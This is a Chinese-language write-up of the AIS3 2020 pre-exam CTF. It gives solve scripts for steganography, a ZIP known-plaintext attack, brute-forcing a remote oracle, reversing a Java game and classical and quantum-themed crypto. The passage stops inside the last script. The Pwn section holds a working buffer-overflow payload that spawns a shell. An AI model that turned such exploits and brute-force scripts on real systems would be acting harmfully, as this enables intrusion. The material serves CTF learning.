# AIS3 Pre-exam Writeup
這算是我修完資訊安全食物後，第一次算是比較認真的打CTFㄅ，應該啦......

![](https://i.imgur.com/YXjCzhs.png)
### 官方Writeup
- Reverse：http://blog.terrynini.tw/tw/2020-AIS3-%E5%89%8D%E6%B8%AC%E5%AE%98%E6%96%B9%E8%A7%A3/
- WEB：https://github.com/djosix/AIS3-2020-Pre-Exam
- PWN：https://github.com/ss8651twtw/ais3-pre-exam-2020
- MISC：https://github.com/frozenkp/CTF/tree/master/2020/AIS3_pre-exam

## 🐧Misc

### 💤Piquero 
I can’t see the flag. Where is it?
![](https://i.imgur.com/92iLvvo.jpg)
打開看到了一個盲人點字的圖，剛好想到啾啾鞋最近推出的影片
https://www.youtube.com/watch?v=1aop1ursHVE

參考一下維基百科的點字排列方式
![](https://i.imgur.com/Jah0XNf.png)


可以解出AIS3 I feel sleepy Good Night!!!

已知FLAG形式為AIS3{FLAG}

大多數的Flag都會用\_當作單字的分隔
所以`AIS3{I_feel_sleepy_Good_Night!!!`

### 🐥Karuego
Students who fail to summon will be dropped out.
![](https://i.imgur.com/eV0hWp9.jpg)

載下來看是一張png的圖片
![](https://i.imgur.com/UoyBe8G.png)
用Binwalk看得出裡面有藏一些東西

![](https://i.imgur.com/EhYtCIx.png)
直接用foremost炸開他，可以看到裡面有一個Zip檔案
這個zip檔案是被加密的
![](https://i.imgur.com/w2Dlpcs.png)

直接strings這個zip檔案，可以看到有一個很長的檔名
`3a66fa5887bcb740438f1fb49f78569cb56e9233_hq.jpg`
![](https://i.imgur.com/3CYQpCb.png)

丟去Google後，在這個網站找到了圖片，載下來備用
https://aminoapps.com/c/demonandangel/page/blog/how-to-summon-a-demon/3W7L_xErcBuggRRDrWKYK328J6rB06W1M03
![](https://i.imgur.com/Ym7QomT.jpg)




創建一個相同路徑的壓縮檔
![](https://i.imgur.com/Os2CVyg.png)

使用pkcrack，已知明文攻擊的程式。
大概就是一種神奇的黑科技，只要有明文也有秘文，就有辦法取得答案
![](https://i.imgur.com/7h835rL.png)
![](https://i.imgur.com/V8s8pnz.png)

獲得了zip的密碼為`lafire`

接下來就順利解開，看到一張圖片

![](https://i.imgur.com/7WYDfmH.jpg)

就是FLAGㄌ

`AIS3{Ar3_y0u_r34l1y_t0_sumnn0n_4_D3m0n?}`


### 🌱Soy
看到了一張壞掉的QR Code
![](https://i.imgur.com/SKS8cOK.png)

用Photoshop調顏色之後，比眼力
![](https://i.imgur.com/UXbbx6g.jpg)

接下來用Powerpoint手動修復
![](https://i.imgur.com/MDjBxsB.png)

發現還是解不出來QQQQQ
後來找到了一個工具

https://merricx.github.io/qrazybox/

![](https://i.imgur.com/XFFX81x.png)

重新點了一次，就解出來ㄌ

`AIS3{H0w_c4n_y0u_f1nd_me?!?!?!!}`

### 👑Saburo
Spell you flag and fight with me.

PS. flag is printable characters with AIS3{…}

nc 60.250.197.227 

發現輸入正確的FLAG，數字會增加，而錯誤的數字則錯誤不變

但是這個回傳數字是Random會跳的，因此寫一個腳本直接暴力破解他

把所有printable ascii都取5次算平均

```python
from pwn import *

context.log_level = 'error'

def mean(a):
    return sum(a)/len(a)

n = [chr(i) for i in range(0x20,0x7F)]


qqqq = 'A1r1ght_U_4r3_my_3n3nnies'
while True:
    print('AIS3{' + qqqq)
    d = {}
    for j in n:
        nn = []
        for i in range(5):
            r = remote('60.250.197.227',11001)
            r.recvuntil(':')
            r.sendline('AIS3{'+ qqqq +j)
            l = r.recvuntil('.')
            # print(l.split(' ')[5])
            nn.append(int(l.split(' ')[5]))
            r.close()
        d[j] = mean(nn)
        print(d)


    print(d.keys()[d.values().index(max(d.values()))],max(d.values()))
    qqqq += d.keys()[d.values().index(max(d.values()))]
```

FLAG:`AIS3{A1r1ght_U_4r3_my_3n3nnies}`

## ♻️Reverse
### 🍍TsaiBro
很好....你很腦殘嗎....敢這樣講刀劍神域.......我死也不會放過你 我..要..殺死...你..

用File觀察後發現是Linux的Elf
![](https://i.imgur.com/z65i1bE.png)

發現程式會固定輸出
`Terry...逆逆...沒有...學問...單純...分享...個人...生活...感觸...\n`
![](https://i.imgur.com/6m5inrr.png)

觀察TasiBroSaid
```
Terry...逆逆...沒有...學問...單純...分享...個人...生活...感觸...
發財..發財.......發財....發財.......發財....發財.發財........發財.......發財.發財......發財..發財.....發財........發財.......發財......發財.......發財.發財........發財..發財.....發財..發財....發財.....發財.....發財.發財........發財......發財....發財........發財........發財.....發財......發財......發財.發財.發財........發財......發財.......發財........發財........發財.....發財.......發財.發財........發財.發財...發財......發財....發財........發財.....發財......發財.......發財.發財........發財...發財...發財......發財....發財........發財........發財.......發財....發財.......發財....發財........發財.......發財...發財......發財......發財...發財........發財.......發財.發財........發財...發財..發財......發財.發財......發財..發財..發財....發財......發財......發財........發財.......發財.發財........發財...發財..發財.....發財.....發財.發財...發財.發財........發財.......發財.發財......發財........發財......發財.......發財.發財........發財...發財.....發財..發財....發財......發財......發財........發財.......發財.發財........發財.......發財....發財...發財.......發財...發財.......發財...發財.......發財...發財.......發財...發財.......發財...發財.......發財...發財.......發財...發財.......發財...發財.......發財...發財.......發財...發財.......發財...發財.......發財...發財.......發財...發財.......發財...發財.......發財...發財.......發財...發財.......發財...發財.......發財...發財.......發財...發財......發財......發財...發財.發財........發財.發財...發財......發財....發財........發財.....發財......發財.......發財.發財........發財......發財........發財........發財.....發財...發財.....發財........發財.......發財.發財.......
```
看起來就是程式輸入指定字串，回傳的東西，先猜輸入的字串就是FLAG

已知FLAG開頭是`AIS3{`

![](https://i.imgur.com/0biff4U.png)

輸入進去發現與這個檔案完全相符
![](https://i.imgur.com/TgsE3Jk.png)

接下來就把字串簡單整理一下，然後直接爆破

```python
import os


rt = """Terry...逆逆...沒有...學問...單純...分享...個人...生活...感觸...
"""

lst = ['..',
 '.......',
 '....',
 '.......',
 '....',
 '.',
 '........',
 '.......',
 '.',
 '......',
 '..',
 '.....',
 '........',
 '.......',
 '......',
 '.......',
 '.',
 '........',
 '..',
 '.....',
 '..',
 '....',
 '.....',
 '.....',
 '.',
 '........',
 '......',
 '....',
 '........',
 '........',
 '.....',
 '......',
 '......',
 '.',
 '.',
 '........',
 '......',
 '.......',
 '........',
 '........',
 '.....',
 '.......',
 '.',
 '........',
 '.',
 '...',
 '......',
 '....',
 '........',
 '.....',
 '......',
 '.......',
 '.',
 '........',
 '...',
 '...',
 '......',
 '....',
 '........',
 '........',
 '.......',
 '....',
 '.......',
 '....',
 '........',
 '.......',
 '...',
 '......',
 '......',
 '...',
 '........',
 '.......',
 '.',
 '........',
 '...',
 '..',
 '......',
 '.',
 '......',
 '..',
 '..',
 '....',
 '......',
 '......',
 '........',
 '.......',
 '.',
 '........',
 '...',
 '..',
 '.....',
 '.....',
 '.',
 '...',
 '.',
 '........',
 '.......',
 '.',
 '......',
 '........',
 '......',
 '.......',
 '.',
 '........',
 '...',
 '.....',
 '..',
 '....',
 '......',
 '......',
 '........',
 '.......',
 '.',
 '........',
 '.......',
 '....',
 '...',
 '.......',
 '...',
 '.......',
 '...',
 '.......',
 '...',
 '.......',
 '...',
 '.......',
 '...',
 '.......',
 '...',
 '.......',
 '...',
 '.......',
 '...',
 '.......',
 '...',
 '.......',
 '...',
 '.......',
 '...',
 '.......',
 '...',
 '.......',
 '...',
 '.......',
 '...',
 '.......',
 '...',
 '.......',
 '...',
 '.......',
 '...',
 '.......',
 '...',
 '.......',
 '...',
 '......',
 '......',
 '...',
 '.',
 '........',
 '.',
 '...',
 '......',
 '....',
 '........',
 '.....',
 '......',
 '.......',
 '.',
 '........',
 '......',
 '........',
 '........',
 '.....',
 '...',
 '.....',
 '........',
 '.......',
 '.',
 '.......']
# AIS3{y3s_y0

lst1 = []
for rrr in range(0,len(lst),2):
    # print('發財'+lst[rrr]+'發財'+lst[rrr+1])
    lst1.append('發財'+lst[rrr]+'發財'+lst[rrr+1])

# print(lst1)


a = list(r'56789{}_WXY0yzABabcdmnopSTUVGHIJKLMNuvwxefghqrstijklOPQRCDEF1234')



# print(ch)

# l = os.popen(payload + t).read()
# if l == ch:
#     print(t)


payload = './TsaiBro '
ch = 'Terry...逆逆...沒有...學問...單純...分享...個人...生活...感觸...\n'
# ch += lst1[0]

t = 'A'
for rrr in lst1:
    ch += rrr
    for i in a:
        l = os.popen(payload + t + i).read()

        if l == ch:
            print(t)
            t+= i 
```


```
steven@Vm-ubuntu-20-04:~/code/ais3$ python3 tsai.py  
A
AI
AIS
AIS3
AIS3{
AIS3{y
AIS3{y3
AIS3{y3s
AIS3{y3s_
AIS3{y3s_y
AIS3{y3s_y0
AIS3{y3s_y0u
AIS3{y3s_y0u_
AIS3{y3s_y0u_h
AIS3{y3s_y0u_h4
AIS3{y3s_y0u_h4v
AIS3{y3s_y0u_h4ve
AIS3{y3s_y0u_h4ve_
AIS3{y3s_y0u_h4ve_s
AIS3{y3s_y0u_h4ve_s4
AIS3{y3s_y0u_h4ve_s4w
AIS3{y3s_y0u_h4ve_s4w_
AIS3{y3s_y0u_h4ve_s4w_7
AIS3{y3s_y0u_h4ve_s4w_7h
AIS3{y3s_y0u_h4ve_s4w_7h1
AIS3{y3s_y0u_h4ve_s4w_7h1s
AIS3{y3s_y0u_h4ve_s4w_7h1s_
AIS3{y3s_y0u_h4ve_s4w_7h1s_c
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4l
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3n
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_b
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_be
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_b
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_i
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_it
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_l
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_lo
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_loo
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_looo
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_loooo
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_looooo
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_loooooo
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_looooooo
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_loooooooo
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_looooooooo
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_loooooooooo
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_looooooooooo
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_loooooooooooo
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_looooooooooooo
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_loooooooooooooo
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_looooooooooooooo
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_loooooooooooooooo
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_looooooooooooooooo
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_loooooooooooooooooo
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_looooooooooooooooooo
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_looooooooooooooooooon
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_looooooooooooooooooong
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_looooooooooooooooooong_
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_looooooooooooooooooong_7
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_looooooooooooooooooong_7h
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_looooooooooooooooooong_7h1
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_looooooooooooooooooong_7h1s
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_looooooooooooooooooong_7h1s_
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_looooooooooooooooooong_7h1s_t
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_looooooooooooooooooong_7h1s_t1
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_looooooooooooooooooong_7h1s_t1m
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_looooooooooooooooooong_7h1s_t1m3
```

我也不知道為什麼最右邊少了一個} 但不管啦，自己補上就好ㄌ

FLAG:`AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_looooooooooooooooooong_7h1s_t1m3`


### 🎹Fallen Beat
CTF player,

我要挑戰你, I'm gonna challenge you!!

ZR

這是我的室友兼 lab 同學,

他已經考過金框暴龍天，他是個旋鈕人,

不像你是個敲鍵盤的,

所以我要測測你的程度到哪裡,

就用 ZR 的大一 project 來決勝負吧！！

得到 Full Combo 來讓我刮目相看！！

author: terrynini

打開是一個音Game，先玩ㄍ兩把再說(X
![](https://i.imgur.com/pcnEXQh.jpg)

程式是.jar檔案，所以上網搜尋ㄍjavaㄉ反編譯程式。

我這邊使用的是這一款jd-gui
http://java-decompiler.github.io

在PanelEnding.class看到了一個可疑的變數
![](https://i.imgur.com/F1oKcTN.png)

繼續追下去可以發現在156行會print出flag
![](https://i.imgur.com/jr6GUdO.png)

這邊出現了一個叫做cache的東西，繼續查下去發現是譜面的檔案，位子在
`/Fallen_Beat/songs/gekkou/hell.txt`

接下來就直接寫一個腳本，模擬這段java code在做的事情
![](https://i.imgur.com/dJEV43T.png)

```python
# a=譜面, 略
a = a.split('\n')
a = [int(i) for i in a]

max_val = 127
flag = [  89, 74, 75, 43, 126, 69, 120, 109, 68, 109, 109, 97, 73, 110, 45, 113, 102, 64, 121, 47, 111, 119, 111, 71, 114, 125, 68, 105, max_val, 124 ,94, 103, 46, 107, 97, 104]

for i in range(len(a)):
    #  this.flag[i % this.flag.length] = (byte)(this.flag[i % this.flag.length] ^ ((Integer)cache.get(i)).intValue());
    flag[i%len(flag)] = flag[i%len(flag)] ^ a[i]
    # print(kk)

f = [chr(i) for i in flag]
print(''.join(f))
```

## 💥 Pwn
### 👻 BOF
That is easy-peasy challenge and even my grandma can do.
嘲諷到說他阿媽都會.....

當然要解出來囉

先Checksec看一下，沒有canary保護
![](https://i.imgur.com/CzuEsSL.png)

丟ida按F5

看到gets很明顯可以玩buffer overflow
![](https://i.imgur.com/4LBihja.png)

400687部分可以執行sh
![](https://i.imgur.com/hB3Fq4d.png)

很直覺的知道，v4總共有0x30格，加上一個saved rbp。所以需要蓋到0x38再想辦法跳過去就好ㄌ

但是會發現死掉了QQQ

收到一個SIGSEGV
![](https://i.imgur.com/wUd48S8.png)

找到了這篇Stack overflow的文章

https://stackoverflow.com/questions/54393105/libcs-system-when-the-stack-pointer-is-not-16-padded-causes-segmentation-faul

簡單來說，在執行system時，會先檢查stack有沒有對齊，在沒有對齊的狀況下會壞掉。最簡單的解法就是加一個ret。

```python
from pwn import *

p = process('bof')
# p = remote('60.250.197.227',10000)
l = p.readline()
print(l)


payload = 'a'*0x30
payload += 'a'*0x8

payload += p64(0x400730)
payload += p64(0x400687)
# raw_input()
p.sendline(payload)

p.interactive()
```
寫Writeup時，伺服器好像已經關了，所以就只有本地測試QQ

## 🙊 Crypto
### 🦕 Brontosaurus
Brontosaurus peek at last year’s problems with a long neck and picked up "KcufsJ".

先把檔案貓出來看一下
![](https://i.imgur.com/LIZhIk3.png)

看起來很像jsfuck，但是直接執行是失敗的。

這個檔案檔名就叫做KcufsJ 反過來的jsfuck，所以先把字串複製出來反轉

``` python
a = 那一坨
a = a[::-1]
print(a)
```

隨便打開瀏覽器的console貼上去
![](https://i.imgur.com/WaBRAz5.png)

FLAG:`AIS3{Br0n7Os4uru5_ch3at_3asi1Y}`

### 🦖 T-Rex
Tyrannosaurus-rex is an nihilist.

照慣例先貓他一下，看起來是一個對照表
![](https://i.imgur.com/j5F5qhB.png)

直接寫腳本對照

```python
dict = {
    '!!':'V',
    '@!':'F',
    '#!':'Y',
    '$!':'J',
    '%!':'6',
    '&!':'1',

    '!@':'5',
    '@@':'0',
    '#@':'M',
    '$@':'2',
    '%@':'9',
    '&@':'L',

    '!#':'I',
    '@#':'W',
    '##':'H',
    '$#':'S',
    '%#':'4',
    '&#':'Q',

    '!$':'K',
    '@$':'G',
    '#$':'B',
    '$$':'X',
    '%$':'T',
    '&$':'A',

    '!%':'E',
    '@%':'3',
    '#%':'C',
    '$%':'7',
    '%%':'P',
    '&%':'N',


    '!&':'U',
    '@&':'Z',
    '#&':'8',
    '$&':'R',
    '%&':'D',
    '&&':'O',
}

s = "&$ !# $# @%"

for i in s.split(' '):
    print(dict[i],end='')

print('{',end='')

s = "%$ #! $& %# &% &% @@ $# %# !& $& !& !@ _ $& @% $$ _ @$ !# !! @% _ #! @@ !& _ $# && #@ !% %$ ## !# &% @$ _ $& &$ &% %& && #@ _ !@ %$ %& %! $$ &# !# !! &% @% ## $% !% !& @! #& && %& !% %$ %# %$ @% ## %@ @@ $% ## !& #% %! %@ &@ %! &@ %$ $# ## %# !$ &% @% !% !& $& &% %# %@ #$ !# && !& #! %! ## #$ @! #% !! $! $& @& %% @@ && #& @% @! @# #@ @@ @& !@ %@ !# !# $# $! !@ &$ $@ !! @! &# @$ &! &# $! @@ &@ !% #% #! &@ &$ @@ &$ &! !& #! !# ## %$ !# !# %$ &! !# @# ## @@ $! $$ %# %$ @% @& $! &! !$ $# #$ $& #@ %@ @$ !% %& %! @% #% $! !! #$ &# ## &# && $& !! !% $! @& !% &@ !& $! @# !@ !& @$ $% #& #$ %@ %% %% &! $# !# $& #@ &! !# @! !@ @@ @@ ## !@ $@ !& $# %& %% !# !! $& !$ $% !! @$ @& !& &@ #$ && @% $& $& !% &! && &@ &% @$ &% &$ &@ $$"

for i in s.split(' '):
    try:
        print(dict[i],end='')
    except:
        print('_',end='')


print('}',end='')
```

然後就得出來了，有夠長...
![](https://i.imgur.com/0lvAnla.png)

### 🐙 Octopus
BB84 quantum key distribution has 8 main directions,
just like a cute octopus A __ A.

這一題是可愛ㄉ小章魚，簡單來說就是去實作了BB84的量子金鑰分發，

找到了Google CTF有一個很像的題目
https://devel0pment.de/?p=1533

這一題他提供了量子的基底以及偏振態，還有用數字表示的方向(用complex極坐標)。所以只需要把跟base相同的拿出來，轉為binary 就好ㄌ！！

``` python
import numpy as np


# qubit
# →: 1j
# ↑: 1+0j
# ↘: 0.707-0.707j
# ↗: 0.707+0.707j

def Q(x):
    return {
        '1j': 1j,
        '(1+0j)': 1+0j,
        '(0.707-0.707j)': 0.707-0.707j,
        '(0.707+0.707j)': 0.707+0.707j
    }[x]

LEN = 1024
basis = ['+', '+', '+', '+', '+', '+', 'x', '+', 'x', '+', '+', '+', 'x', '+', 'x', 'x', '+', 'x', 'x', '+', '+', '+', 'x', 'x', '+', '+', '+', 'x', '+', 'x', 'x', '+', '+', 'x', '+', 'x', '+', '+', 'x', 'x', '+', '+', 'x', '+', '+', '+', '+', 'x', 'x', '+', '+', 'x', 'x', 'x', 'x', 'x', 'x', '+', 'x', '+', '+', 'x', '+', '+', 'x', 'x', '+', '+', '+', '+', '+', 'x', '+', '+', 'x', 'x', 'x', 'x', 'x', 'x', 'x', '+', '+', 'x', '+', 'x', 'x', '+', '+', '+', '+', 'x', 'x', 'x', '+', '+', '+', 'x', 'x', 'x', 'x', '+', 'x', 'x', '+', 'x', '+', 'x', '+', 'x', '+', '+', '+', 'x', 'x', 'x', 'x', 'x', '+', 'x', '+', '+', '+', '+', '+', '+', '+', '+', 'x', 'x', 'x', 'x', '+', '+', '+', '+', '+', 'x', 'x', '+', 'x', 'x', 'x', 'x', '+', 'x', 'x', '+', 'x', 'x', '+', '+', '+', '+', '+', 'x', '+', '+', '+', 'x', '+', '+', 'x', 'x', '+', '+', 'x', 'x', 'x', '+', 'x', '+', '+', 'x', 'x', 'x', 'x', '+', 'x', 'x', 'x', 'x', 'x', 'x', 'x', '+', 'x', '+', 'x', 'x', 'x', '+', '+', 'x', 'x', '+', 'x', '+', 'x', 'x', '+', '+', 'x', '+', '+', '+', 'x', 'x', '+', 'x', '+', '+', '+', '+', '+', '+', 'x', '+', '+', 'x', 'x', 'x', '+', 'x', 'x', 'x', 'x', 'x', '+', 'x', 'x', 'x', '+', '+', 'x', 'x', '+', 'x', 'x', '+', '+', 'x', '+', '+', 'x', 'x', '+', '+', '+', 'x', '+', 'x', '+', '+', '+', '+', 'x', '+', '+', 'x', '+', '+', '+', 'x', 'x', 'x', '+', '+', '+', '+', 'x', 'x', '+', 'x', '+', 'x', '+', '+', 'x', 'x', 'x', '+', 'x', '+', '+', 'x', '+', 'x', '+', '+', 'x', 'x', '+', 'x', '+', '+', '+', 'x', '+', '+', '+', '+', '+', '+', 'x', '+', '+', '+', 'x', '+', '+', 'x', '+', 'x', 'x', '+', 'x', '+', 'x', '+', 'x', 'x', 'x', 'x', 'x', '+', '+', 'x', 'x', 'x', '+', '+', '+', '+', 'x', '+', 'x', 'x', '+', 'x', '+', 'x', 'x', 'x', 'x', '+', 'x', 'x', 'x', 'x', 'x', '+', '+', '+', '+', '+', '+', 'x', '+', 'x', '+', 'x', 'x', 'x', '+', '+', '+', '+', '+', '+', 'x', 'x', 'x', 'x', '+', 'x', 'x', '+', 'x', '+', 'x', '+', 'x', '+', 'x', 'x', '+', 'x', 'x', '+', 'x', '+', '+', 'x', '+', '+', 'x', 'x', '+', 'x', 'x', 'x', 'x', 'x', '+', 'x', '+', '+', '+', '+', 'x', '+', '+', '+', 'x', '+', 'x', '+', 'x', 'x', '+', '+', '+', 'x', 'x', 'x', '+', 'x', '+', 'x', '+', '+', 'x', '+', 'x', '+', 'x', 'x', 'x', 'x', '+', 'x', '+', 'x', 'x', '+', '+', '+', '+', 'x', 'x', '+', '+', '+', 'x', '+', 'x', '+', 'x', '+', 'x', '+', 'x', '+', 'x', '+', 'x', '+', '+', '+', 'x', 'x', '+', 'x', 'x', 'x', 'x', '+', 'x', '+', 'x', 'x', '+', 'x', '+', 'x', '+', 'x', 'x', 'x', 'x', 'x', 'x', '+', 'x', 'x', '+', '+', '+', 'x', '+', '+', 'x', '+', 'x', 'x', 'x', '+', '+', '+', '+', '+', 'x', 'x', '+', '+', '+', '+', '+', '+', 'x', '+', 'x', 'x', 'x', '+', 'x', 'x', '+', '+', 'x', 'x', 'x', '+', '+', '+', 'x', '+', 'x', '+', 'x', 'x', 'x', '+', 'x', '+', '+', 'x', 'x', '+', 'x', 'x', '+', '+', 'x', 'x', 'x', '+', 'x', 'x', 'x', 'x', 'x', '+', 'x', '+', '+', '+', '+', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', '+', '+', 'x', 'x', '+', 'x', '+', 'x', 'x', 'x', '+', '+', 'x', '+', '+', 'x', '+', '+', 'x', '+', '+', 'x', 'x', 'x', 'x', 'x', 'x', '+', 'x', 'x', 'x', 'x', '+', '+', 'x', 'x', '+', 'x', 'x', '+', 'x', '+', '+', '+', 'x', '+', '+', '+', '+', '+', '+', '+', '+', 'x', 'x', '+', '+', '+', 'x', 'x', 'x', '+', 'x', '+', 'x', 'x', 'x', '+', '+', 'x', '+', '+', 'x', '+', 'x', 'x', 'x', 'x', '+', 'x', '+', 'x', '+', 'x', '+', '+', 'x', 'x', '+', '+', '+', 'x', 'x', '+', 'x', 'x', '+', '+', '+', '+', 'x', '+', 'x', 'x', '+', 'x', 'x', '+', 'x', '+', '+', '+', 'x', 'x', '+', 'x', '+', 'x', 'x', '+', 'x', 'x', '+', 'x', 'x', 'x', 'x', '+', 'x', 'x', 'x', '+', 'x', '+', '+', 'x', 'x', '+', '+', '+', 'x', '+', '+', 'x', 'x', '+', '+', '+', 'x', 'x', 'x', '+', '+', 'x', 'x', 'x', 'x', '+', '+', 'x', 'x', 'x', '+', '+', '+', 'x', 'x', '+', '+', 'x', '+', '+', '+', 'x', 'x', 'x', '+', '+', '+', '+', '+', 'x', 'x', 'x', '+', 'x', 'x', '+', 'x', 'x', '+', 'x', 'x', '+', '+', '+', '+', 'x', '+', 'x', '+', 'x', 'x', '+', 'x', '+', 'x', '+', '+', '+', '+', 'x', '+', '+', 'x', 'x', '+', 'x', '+', '+', 'x', '+', '+', 'x', 'x', 'x', 'x', '+', '+', '+', '+', 'x', 'x', '+', 'x', 'x', '+', '+', '+', 'x', '+', 'x', 'x', 'x', 'x', '+', '+', 'x', '+', '+', '+', 'x', '+', 'x', '+', '+', 'x', 'x', 'x', 'x', '+', 'x', 'x', '+', '+', '+', 'x', 'x', '+', 'x', 'x', 'x', '+', '+', 'x', 'x', '+', 'x', '+', 'x', 'x', 'x', 'x', 'x', 'x', '+', 'x', '+', '+', 'x', 'x', '+', '+', 'x', '+', '+', '+', '+', 'x', 'x', '+', '+', '+', 'x', '+', 'x', 'x', 'x', '+', 'x', '+', '+', 'x', 'x', '+', '+', '+', '+', '+', 'x', 'x', '+', '+', '+', 'x', 'x', '+', 'x', 'x', '+', '+', 'x', 'x', 'x', '+', '+', 'x', 'x', '+', '+', '+', 'x', 'x', 'x', '+', '+', 'x', '+', 'x', '+', 'x', 'x', '+', 'x', '+', 'x', 'x', '+', '+', '+', '+', 'x', '+', '+', 'x', '+', 'x', '+', '+', '+', '+', '+', '+', '+', 'x', '+', '+', '+', '+', 'x', '+', '+', 'x', '+', 'x', '+', 'x', '+', 'x', 'x', '+', 'x', 'x', '+', 'x', 'x', '+', '+', '+', 'x', '+', 'x', 'x', '+', '+', 'x', '+', 'x', '+', 'x', 'x', '+', '+', '+', 'x', '+', 'x', 'x', '+', '+', 'x', 'x', '+', '+', 'x', '+', '+', '+', '+', '+', 'x', 'x', '+', '+', 'x', 'x', '+', 'x', 'x', 'x', 'x', '+', 'x', '+', '+', '+', 'x']

